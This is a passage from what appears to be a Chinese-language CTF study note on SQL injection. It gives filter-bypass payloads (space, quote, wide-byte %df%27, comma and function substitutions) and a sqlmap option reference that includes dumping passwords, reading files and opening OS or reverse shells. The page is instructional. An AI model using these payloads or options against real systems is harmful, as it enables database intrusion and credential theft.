style="color:#4d4d4d">strcmp()</font></h4><p><font style="color:#4d4d4d">strcmp(str1,str2):</font><br><font style="color:#4d4d4d">若所有的字符串均相同，则返回STRCMP()，若根据当前分类次序，第一个参数小于第二个，则返回 -1，其它情况返回 </font><font style="color:#4d4d4d">1</font></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> cms_users <span class="keyword">where</span> userid<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> strcmp(ascii(substr(database(),<span class="number">0</span>,<span class="number">1</span>)),<span class="number">99</span>);</span><br></pre></td></tr></table></figure><h4 id="in关键字"><a href="#in关键字" class="headerlink" title="in关键字"></a><font style="color:#4d4d4d">in关键字</font></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> cms_users <span class="keyword">where</span> userid<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr(database(),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">in</span> (<span class="string">&#x27;c&#x27;</span>);</span><br></pre></td></tr></table></figure><h4 id="between-a-and-b"><a href="#between-a-and-b" class="headerlink" title="between a and b"></a><font style="color:#4d4d4d">between a and b</font></h4><p><font style="color:#4d4d4d">between a and b:范围在a-b之间（不包含b）</font></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> cms_users <span class="keyword">where</span> userid<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr(database(),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">between</span> <span class="string">&#x27;a&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;d&#x27;</span>;</span><br></pre></td></tr></table></figure><h3 id="7-空格绕过"><a href="#7-空格绕过" class="headerlink" title="7.空格绕过"></a>7.空格绕过</h3><p><font style="color:#4d4d4d">一般绕过空格过滤的方法有以下几种方法来取代空格</font></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**/</span></span><br><span class="line">()</span><br><span class="line">回车(url编码中的<span class="operator">%</span><span class="number">0</span>a)</span><br><span class="line">`(tap键上面的按钮)</span><br><span class="line">tap</span><br><span class="line">两个空格</span><br></pre></td></tr></table></figure><h3 id="8-对or-and-xor-not-绕过"><a href="#8-对or-and-xor-not-绕过" class="headerlink" title="8.对or and xor not 绕过"></a><font style="color:#4f4f4f">8.对or and xor not 绕过</font></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">or</span> <span class="operator">=</span> <span class="operator">||</span></span><br><span class="line"><span class="keyword">and</span> <span class="operator">=</span> <span class="operator">&amp;&amp;</span></span><br><span class="line">xor <span class="operator">=</span> <span class="operator">|</span> 或者 <span class="operator">^</span> # 异或,例如<span class="keyword">Select</span> <span class="operator">*</span> <span class="keyword">from</span> cms_users <span class="keyword">where</span> userid<span class="operator">=</span><span class="number">1</span><span class="operator">^</span>sleep(<span class="number">5</span>);</span><br><span class="line"><span class="keyword">not</span> <span class="operator">=</span> <span class="operator">!</span></span><br></pre></td></tr></table></figure><h3 id="9-对等号-绕过"><a href="#9-对等号-绕过" class="headerlink" title="9.对等号&#x3D;绕过"></a><font style="color:#4f4f4f">9.对等号&#x3D;绕过</font></h3><h4 id="like"><a href="#like" class="headerlink" title="like"></a>like</h4><p><font style="color:#4d4d4d">不加通配符的like执行的效果和 &#x3D; 一致，所以可以用来绕过。</font><br><font style="color:#4d4d4d">正常加上通配符的like：</font></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> <span class="operator">*</span> <span class="keyword">from</span> cms_users <span class="keyword">where</span> username <span class="keyword">like</span> &quot;ad%&quot;;</span><br></pre></td></tr></table></figure><p><font style="color:#4d4d4d">不加上通配符的like可以用来取代&#x3D;：</font></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> <span class="operator">*</span> <span class="keyword">from</span> cms_users <span class="keyword">where</span> username <span class="keyword">like</span> &quot;admin&quot;;</span><br></pre></td></tr></table></figure><h4 id="REGEXP"><a href="#REGEXP" class="headerlink" title="REGEXP"></a><font style="color:#4d4d4d">REGEXP</font></h4><p><font style="color:#4d4d4d">regexp:MySQL中使用 REGEXP 操作符来进行正则表达式匹配</font></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> <span class="operator">*</span> <span class="keyword">from</span> cms_users <span class="keyword">where</span> username REGEXP &quot;admin&quot;;</span><br></pre></td></tr></table></figure><h4 id="大于号小于号"><a href="#大于号小于号" class="headerlink" title="大于号小于号"></a>大于号小于号</h4><p><font style="color:#4d4d4d">使用大小于号来绕过</font></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> <span class="operator">*</span> <span class="keyword">from</span> cms_users <span class="keyword">where</span> userid<span class="operator">&gt;</span><span class="number">0</span> <span class="keyword">and</span> userid<span class="operator">&lt;</span><span class="number">2</span>; #userid<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p><font style="color:#4d4d4d">&lt;&gt; 等价于 !&#x3D; ,所以在前面再加一个 ! 结果就是等号了</font></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> <span class="operator">*</span> <span class="keyword">from</span> cms_users <span class="keyword">where</span> <span class="operator">!</span>(username <span class="operator">&lt;&gt;</span> &quot;admin&quot;);</span><br></pre></td></tr></table></figure><h3 id="10-对单引号的绕过"><a href="#10-对单引号的绕过" class="headerlink" title="10.对单引号的绕过"></a><font style="color:#4f4f4f">10.对单引号的绕过</font></h3><h4 id="使用十六进制"><a href="#使用十六进制" class="headerlink" title="使用十六进制"></a>使用十六进制</h4><p><font style="color:#4d4d4d">会使用到引号的地方一般是在最后的where子句中。如下面的一条sql语句，这条语句就是一个简单的用来查选得到users表中所有字段的一条语句：</font></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name  <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_name<span class="operator">=</span>&quot;users&quot;</span><br></pre></td></tr></table></figure><p><font style="color:#4d4d4d">这个时候如果引号被过滤了，那么上面的where子句就无法使用了。那么遇到这样的问题就要使用十六进制来处理这个问题了。</font><br><font style="color:#4d4d4d">users的十六进制的字符串是7573657273。那么最后的sql语句就变为了：</font></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name  <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_name<span class="operator">=</span><span class="number">0x7573657273</span></span><br></pre></td></tr></table></figure><h4 id="宽字节绕过"><a href="#宽字节绕过" class="headerlink" title="宽字节绕过"></a>宽字节绕过</h4><p><font style="color:#4d4d4d">过滤单引号时，可以试试宽字节</font></p><p><font style="color:#4d4d4d">过滤 ‘ 的时候往往利用的思路是将 ‘ 转换为 ‘ 。</font></p><p><font style="color:#4d4d4d">在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字</font></p><p><font style="color:#601bde">%df</font><font style="color:#4d4d4d"> 吃掉 \ 具体的方法是 urlencode(’) &#x3D; </font><font style="color:#601bde">%5c%27</font><font style="color:#4d4d4d">，我们在 </font><font style="color:#601bde">%5c%27</font><font style="color:#4d4d4d"> 前面添加 </font><font style="color:#601bde">%df</font><font style="color:#4d4d4d"> ，形成</font><font style="color:#601bde">%df%5c%27 </font><font style="color:#4d4d4d">，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，</font><font style="color:#601bde">%df%5c</font><font style="color:#4d4d4d"> 就是一个汉字，</font><font style="color:#601bde">%27</font><font style="color:#4d4d4d"> 作为一个单独的 ’ 符号在外面：</font></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="operator">%</span>df<span class="operator">%</span><span class="number">27</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">user</span>(),<span class="number">3</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><h3 id="11-对于逗号的绕过"><a href="#11-对于逗号的绕过" class="headerlink" title="11.对于逗号的绕过"></a>11.对于逗号的绕过</h3><p><font style="color:#4d4d4d">sql盲注时常用到以下的函数：</font></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">substr()</span><br><span class="line">substr(string, pos, len):从pos开始，取长度为len的子串</span><br><span class="line">substr(string, pos):从pos开始，取到string的最后</span><br><span class="line"></span><br><span class="line"><span class="built_in">substring</span>()</span><br><span class="line">用法和substr()一样</span><br><span class="line"></span><br><span class="line">mid()</span><br><span class="line">用法和substr()一样，但是mid()是为了向下兼容VB6<span class="number">.0</span>，已经过时，以上的几个函数的pos都是从<span class="number">1</span>开始的</span><br><span class="line"></span><br><span class="line"><span class="keyword">left</span>()和<span class="keyword">right</span>()</span><br><span class="line"><span class="keyword">left</span>(string, len)和<span class="keyword">right</span>(string, len):分别是从左或从右取string中长度为len的子串</span><br><span class="line"></span><br><span class="line">limit</span><br><span class="line">limit pos len:在返回项中从pos开始去len个返回值，pos的从<span class="number">0</span>开始</span><br><span class="line"></span><br><span class="line">ascii()和<span class="type">char</span>()</span><br><span class="line">ascii(<span class="type">char</span>):把<span class="type">char</span>这个字符转为ascii码</span><br><span class="line"><span class="type">char</span>(ascii_int):和ascii()的作用相反，将ascii码转字符</span><br></pre></td></tr></table></figure><h4 id="对于substr-和mid-这两个方法可以使用from-for-的方式来解决"><a href="#对于substr-和mid-这两个方法可以使用from-for-的方式来解决" class="headerlink" title="对于substr()和mid()这两个方法可以使用from for 的方式来解决"></a><strong><font style="color:#000">对于substr()和mid()这两个方法可以使用from for 的方式来解决</font></strong></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> substr(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;c&#x27;</span>;</span><br></pre></td></tr></table></figure><h4 id="使用join关键字来绕过"><a href="#使用join关键字来绕过" class="headerlink" title="使用join关键字来绕过"></a><font style="color:#000">使用join关键字来绕过</font></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>;</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> ((<span class="keyword">select</span> <span class="number">1</span>)A <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)B <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">3</span>)C <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">4</span>)D);</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> ((<span class="keyword">select</span> <span class="number">1</span>)A <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)B <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">3</span>)C <span class="keyword">join</span> (<span class="keyword">select</span> group_concat(<span class="keyword">user</span>(),<span class="string">&#x27; &#x27;</span>,database(),<span class="string">&#x27; &#x27;</span>,@<span class="variable">@datadir</span>))D);</span><br></pre></td></tr></table></figure><h4 id="使用like关键字-适用于substr-等提取子串的函数中的逗号"><a href="#使用like关键字-适用于substr-等提取子串的函数中的逗号" class="headerlink" title="使用like关键字 适用于substr()等提取子串的函数中的逗号"></a><font style="color:#000">使用like关键字 适用于substr()等提取子串的函数中的逗号</font></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> ascii(mid(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">80</span>   #等价于</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>() <span class="keyword">like</span> <span class="string">&#x27;r%&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="使用offset关键字"><a href="#使用offset关键字" class="headerlink" title="使用offset关键字"></a><font style="color:#000">使用offset关键字</font></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> cms_users limit <span class="number">0</span>,<span class="number">1</span>;</span><br><span class="line"># 等价于下面这条<span class="keyword">SQL</span>语句</span><br><span class="line"> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> cms_users limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><h3 id="12-过滤函数绕过"><a href="#12-过滤函数绕过" class="headerlink" title="12.过滤函数绕过"></a>12.过滤函数绕过</h3><h4 id="sleep-被过滤时"><a href="#sleep-被过滤时" class="headerlink" title="sleep()被过滤时"></a>sleep()被过滤时</h4><p>sleep()时延时盲注中最常见的函数 当sleep()被过滤时可以使用benchmark()来代替</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sleep() <span class="comment">--&gt;benchmark()</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">12</span>,<span class="number">23</span> <span class="keyword">and</span> sleep(<span class="number">1</span>);</span><br><span class="line">参数可以是需要执行的次数和表达式。第一个参数是执行次数，第二个执行的表达式</span><br><span class="line"><span class="keyword">select</span> <span class="number">12</span>,<span class="number">23</span> <span class="keyword">and</span> benchmark(<span class="number">10000000</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure><h4 id="ascii-被过滤时"><a href="#ascii-被过滤时" class="headerlink" title="ascii()被过滤时"></a>ascii()被过滤时</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ascii()–<span class="operator">&gt;</span>hex()、bin()</span><br><span class="line">替代之后再使用对应的进制转string即可</span><br></pre></td></tr></table></figure><h4 id="group-concat-被过滤时"><a href="#group-concat-被过滤时" class="headerlink" title="group_concat()被过滤时"></a>group_concat()被过滤时</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">group_concat()–<span class="operator">&gt;</span>concat_ws()</span><br><span class="line"><span class="keyword">select</span> group_concat(“str1”,“str2”);#等价于</span><br><span class="line"><span class="keyword">select</span> concat_ws(“,”,“str1”,“str2”);</span><br></pre></td></tr></table></figure><h4 id="substr-substring-mid-被过滤时"><a href="#substr-substring-mid-被过滤时" class="headerlink" title="substr(),substring(),mid()被过滤时"></a><font style="color:#000">substr(),substring(),mid()被过滤时</font></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substr(),<span class="built_in">substring</span>(),mid()可以相互取代, 取子串的函数还有<span class="keyword">left</span>(),<span class="keyword">right</span>()</span><br></pre></td></tr></table></figure><h4 id="user-datadir-ord-被过滤时"><a href="#user-datadir-ord-被过滤时" class="headerlink" title="user() datadir ord()被过滤时"></a><font style="color:#000">user() datadir ord()被过滤时</font></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">user</span>() <span class="comment">--&gt; @@user、datadir–&gt;@@datadir</span></span><br><span class="line">ord()–<span class="operator">&gt;</span>ascii():这两个函数在处理英文时效果一样，但是处理中文等时不一致。</span><br></pre></td></tr></table></figure><h4 id="过滤了if函数："><a href="#过滤了if函数：" class="headerlink" title="过滤了if函数："></a><font style="color:#000">过滤了if函数：</font></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if函数的判断语句</span><br><span class="line"><span class="keyword">select</span> if(substr(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;c&#x27;</span>,<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">IFNULL函数</span><br><span class="line"><span class="keyword">select</span> ifnull(substr(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;c&#x27;</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">case</span> <span class="keyword">when</span> <span class="keyword">then</span>函数</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">case</span> substr(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;c&#x27;</span> <span class="keyword">when</span> <span class="number">1</span> <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span>;</span><br></pre></td></tr></table></figure><h2 id="七、注入方式及工具-sqlmap-的使用"><a href="#七、注入方式及工具-sqlmap-的使用" class="headerlink" title="七、注入方式及工具 sqlmap 的使用"></a>七、注入方式及工具 sqlmap 的使用</h2><h3 id="sqlmap-工具安装及介绍"><a href="#sqlmap-工具安装及介绍" class="headerlink" title="sqlmap 工具安装及介绍"></a>sqlmap 工具安装及介绍</h3><h4 id="安装-安装教程"><a href="#安装-安装教程" class="headerlink" title="安装;安装教程"></a><strong>安装;</strong><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hai-long/p/10384752.html"><strong>安装教程</strong></a></h4><p>1、配置好 python</p><p>2、到 <a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap">github</a> 上下载 源码解压就可以，</p><h4 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h4><p><strong>参考文章：</strong></p><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/9326258.html"><strong>sqlmap超详细笔记+思维导图</strong></a></p><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ichunqiu/p/5805108.html"><strong>SQLMAP注入教程-11种常见SQLMAP使用方法详解</strong></a></p><p><strong>各种参数的含义</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">-</span>u  #注入网址</span><br><span class="line"><span class="operator">-</span>f  #指纹判别数据库类型 </span><br><span class="line"><span class="operator">-</span>b  #获取数据库版本信息 </span><br><span class="line"><span class="operator">-</span>p  #指定可测试的参数(?page<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>id<span class="operator">=</span><span class="number">2</span> <span class="operator">-</span>p &quot;page,id&quot;) </span><br><span class="line"><span class="operator">-</span>D &quot;&quot;  #指定数据库名 </span><br><span class="line"><span class="operator">-</span>T &quot;&quot;  #指定表名 </span><br><span class="line"><span class="operator">-</span>C &quot;&quot;  #指定字段 </span><br><span class="line"><span class="operator">-</span>s &quot;&quot;  #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：<span class="operator">-</span>s &quot;xx.log&quot;　　恢复:<span class="operator">-</span>s &quot;xx.log&quot; <span class="comment">--resume) </span></span><br><span class="line"><span class="comment">--level=(1-5) #要执行的测试水平等级，默认为1 </span></span><br><span class="line"><span class="comment">--risk=(0-3)  #测试执行的风险等级，默认为1 </span></span><br><span class="line"><span class="comment">--time-sec=(2,5) #延迟响应，默认为5 </span></span><br><span class="line"><span class="comment">--data #通过POST发送数据 </span></span><br><span class="line"><span class="comment">--columns        #列出字段 </span></span><br><span class="line"><span class="comment">--current-user   #获取当前用户名称 </span></span><br><span class="line"><span class="comment">--current-db     #获取当前数据库名称 </span></span><br><span class="line"><span class="comment">--users          #列数据库所有用户 </span></span><br><span class="line"><span class="comment">--passwords      #数据库用户所有密码 </span></span><br><span class="line"><span class="comment">--privileges     #查看用户权限(--privileges -U root) </span></span><br><span class="line"><span class="operator">-</span>U               #指定数据库用户 </span><br><span class="line"><span class="comment">--dbs            #列出所有数据库 </span></span><br><span class="line"><span class="comment">--tables -D &quot;&quot;   #列出指定数据库中的表 </span></span><br><span class="line"><span class="comment">--columns -T &quot;user&quot; -D &quot;mysql&quot;      #列出mysql数据库中的user表的所有字段 </span></span><br><span class="line"><span class="comment">--dump-all            #列出所有数据库所有表 </span></span><br><span class="line"><span class="comment">--exclude-sysdbs      #只列出用户自己新建的数据库和表 </span></span><br><span class="line"><span class="comment">--dump -T &quot;&quot; -D &quot;&quot; -C &quot;&quot;   #列出指定数据库的表的字段的数据(--dump -T users -D master -C surname) </span></span><br><span class="line"><span class="comment">--dump -T &quot;&quot; -D &quot;&quot; --start 2 --top 4  # 列出指定数据库的表的2-4字段的数据 </span></span><br><span class="line"><span class="comment">--dbms    #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) </span></span><br><span class="line"><span class="comment">--os      #指定系统(Linux,Windows) </span></span><br><span class="line"><span class="operator">-</span>v  #详细的等级(<span class="number">0</span><span class="number">-6</span>) </span><br><span class="line">    <span class="number">0</span>：只显示Python的回溯，错误和关键消息。 </span><br><span class="line">    <span class="number">1</span>：显示信息和警告消息。 </span><br><span class="line">    <span class="number">2</span>：显示调试消息。 </span><br><span class="line">    <span class="number">3</span>：有效载荷注入。 </span><br><span class="line">    <span class="number">4</span>：显示HTTP请求。 </span><br><span class="line">    <span class="number">5</span>：显示HTTP响应头。 </span><br><span class="line">    <span class="number">6</span>：显示HTTP响应页面的内容 </span><br><span class="line"><span class="comment">--privileges  #查看权限 </span></span><br><span class="line"><span class="comment">--is-dba      #是否是数据库管理员 </span></span><br><span class="line"><span class="comment">--roles       #枚举数据库用户角色 </span></span><br><span class="line"><span class="comment">--udf-inject  #导入用户自定义函数（获取系统权限） </span></span><br><span class="line"><span class="comment">--union-check  #是否支持union 注入 </span></span><br><span class="line"><span class="comment">--union-cols #union 查询表记录 </span></span><br><span class="line"><span class="comment">--union-test #union 语句测试 </span></span><br><span class="line"><span class="comment">--union-use  #采用union 注入 </span></span><br><span class="line"><span class="comment">--union-tech orderby #union配合order by </span></span><br><span class="line"><span class="comment">--data &quot;&quot; #POST方式提交数据(--data &quot;page=1&amp;id=2&quot;) </span></span><br><span class="line"><span class="comment">--cookie &quot;用;号分开&quot;      #cookie注入(--cookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”) </span></span><br><span class="line"><span class="comment">--referer &quot;&quot;     #使用referer欺骗(--referer &quot;http://www.baidu.com&quot;) </span></span><br><span class="line"><span class="comment">--user-agent &quot;&quot;  #自定义user-agent </span></span><br><span class="line"><span class="comment">--proxy &quot;http://127.0.0.1:8118&quot; #代理注入 </span></span><br><span class="line"><span class="comment">--string=&quot;&quot;    #指定关键词,字符串匹配. </span></span><br><span class="line"><span class="comment">--threads 　　  #采用多线程(--threads 3) </span></span><br><span class="line"><span class="comment">--sql-shell    #执行指定sql命令 </span></span><br><span class="line"><span class="comment">--sql-query    #执行指定的sql语句(--sql-query &quot;SELECT password FROM mysql.user WHERE user = &#x27;root&#x27; LIMIT 0, 1&quot; ) </span></span><br><span class="line"><span class="comment">--file-read    #读取指定文件 </span></span><br><span class="line"><span class="comment">--file-write   #写入本地文件(--file-write /test/test.txt --file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt) </span></span><br><span class="line"><span class="comment">--file-dest    #要写入的文件绝对路径 </span></span><br><span class="line"><span class="comment">--os-cmd=id    #执行系统命令 </span></span><br><span class="line"><span class="comment">--os-shell     #系统交互shell </span></span><br><span class="line"><span class="comment">--os-pwn       #反弹shell(--os-pwn --msf-path=/opt/framework/msf3/) </span></span><br><span class="line"><span class="comment">--msf-path=    #matesploit绝对路径(--msf-path=/opt/framework/msf3/) </span></span><br><span class="line"><span class="comment">--os-smbrelay  # </span></span><br><span class="line"><span class="comment">--os-bof       # </span></span><br><span class="line"><span class="comment">--reg-read     #读取win系统注册表 </span></span><br><span class="line"><span class="comment">--priv-esc     # </span></span><br><span class="line"><span class="comment">--time-sec=    #延迟设置 默认--time-sec=5 为5秒 </span></span><br><span class="line"><span class="operator">-</span>p &quot;user-agent&quot; <span class="comment">--user-agent &quot;sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)&quot;  #指定user-agent注入 </span></span><br><span class="line"><span class="comment">--eta          #盲注 </span></span><br><span class="line"><span class="operator">/</span>pentest<span class="operator">/</span>database<span class="operator">/</span>sqlmap<span class="operator">/</span>txt<span class="operator">/</span></span><br><span class="line">common<span class="operator">-</span>columns.txt　　字段字典　　　 </span><br><span class="line">common<span class="operator">-</span>outputs.txt </span><br><span class="line">common<span class="operator">-</span>tables.txt      表字典 </span><br><span class="line">keywords.txt </span><br><span class="line">oracle<span class="operator">-</span><span class="keyword">default</span><span class="operator">-</span>passwords.txt </span><br><span class="line"><span class="keyword">user</span><span class="operator">-</span>agents.txt </span><br><span class="line">wordlist.txt </span><br></pre></td></tr></table></figure><p><strong>其他的不多说了，各个题型的 sqlmap 用法在下面都写了，有过滤的没写，还不会写脚本</strong></p><h3 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h3><p>重要函数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 将查到的一个字段内的所有数据，合并为一个字符串输出</span><br><span class="line">group_concat()</span><br><span class="line"># 联合注入的时候我们要让前面的无法输出（前面的设为<span class="number">-1</span>），这样后面的才能输出</span><br></pre></td></tr></table></figure><p><strong>手注的话，在上面已经讲了</strong></p><p><strong>使用工具 sqlmap，以第一题为例</strong></p><p><strong>输入下面的东西，先爆库</strong></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732112171042-c685cd58-b659-43c8-a9a7-a077af1b4f6f.png" referrerpolicy="no-referrer"></p><p>第<strong>一个问我们是否要跳过测试其他 payload，选是。</strong></p><p><strong>第二个看不懂，也选是</strong></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732112247647-d6d0c041-c3eb-43f4-ae5b-a54d9576b925.png" referrerpolicy="no-referrer"></p><p><strong>问我们是否要测试其他参数，选否</strong></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732112351197-d99fea57-d183-43d2-b516-201802c9ee8e.png" referrerpolicy="no-referrer"></p><p><strong>库名</strong></p><p><img 